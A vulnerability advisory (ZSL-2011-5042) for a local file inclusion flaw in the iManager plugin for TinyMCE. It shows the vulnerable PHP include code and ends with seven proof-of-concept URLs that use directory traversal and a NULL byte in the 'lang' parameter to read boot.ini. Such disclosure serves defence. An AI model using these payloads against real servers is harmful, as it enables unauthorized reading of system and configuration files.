@@ -1,0 +1,63 @@
+iManager Plugin v1.2.8 (lang) Local File Inclusion Vulnerability
+
+
+Vendor: net4visions.com
+Product web page: http://www.net4visions.com
+Affected version: <= 1.2.8 Build 02012008
+
+Summary: With iManager you can manage your files/images on your webserver,
+and it provides user interface to most of the phpThumb() functions. It works
+either stand-alone or as a plugin to WYSIWYG editors like tinyMCE, SPAW,
+htmlAREA, Xinha and FCKeditor.
+
+Desc: iManager suffers from a file inlcusion vulnerability (LFI) / file
+disclosure vulnerability (FD) when input passed thru the 'lang' parameter
+to imanager.php, rfiles.php, symbols.php, colorpicker.php, loadmsg.php,
+ov_rfiles.php and examples.php is not properly verified before being used
+to include files. This can be exploited to include files from local resources
+with directory traversal attacks and URL encoded NULL bytes.
+
+
+======================================================================
+/langs/lang.class.php:
+----------------------------------------------------------------------
+
+67: function loadData() {
+68:    global $cfg;
+69:    include( dirname(__FILE__) . '/' . $this -> lang.'.php' );
+70:    $this -> charset = $lang_charset;
+71:    $this -> dir = $lang_direction;
+72:    $this -> lang_data = $lang_data;
+73:    unset( $lang_data );
+74:    include( dirname(__FILE__) . '/' . $cfg['lang'].'.php' );
+75:    $this -> default_lang_data = $lang_data;
+76: }
+
+======================================================================
+
+
+Tested on: Microsoft Windows XP Professional SP3 (EN)
+           Apache 2.2.14 (Win32)
+           PHP 5.3.1
+           MySQL 5.1.41
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            liquidworm gmail com
+
+
+Advisory ID: ZSL-2011-5042
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2011-5042.php
+
+
+15.09.2011
+
+--
+
+http://[SOME_CMS]/jscripts/tiny_mce/plugins/imanager/imanager.php?lang=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini%00
+http://[SOME_CMS]/jscripts/tiny_mce/plugins/imanager/scripts/colorpicker.php?lang=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini%00
+http://[SOME_CMS]/jscripts/tiny_mce/plugins/imanager/scripts/loadmsg.php?lang=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini%00
+http://[SOME_CMS]/jscripts/tiny_mce/plugins/imanager/scripts/ov_rfiles.php?lang=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini%00
+http://[SOME_CMS]/jscripts/tiny_mce/plugins/imanager/scripts/rfiles.php?lang=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini%00
+http://[SOME_CMS]/jscripts/tiny_mce/plugins/imanager/scripts/symbols.php?lang=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini%00
+http://[SOME_CMS]/jscripts/tiny_mce/plugins/imanager/images/examples/examples.php?lang=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini%00
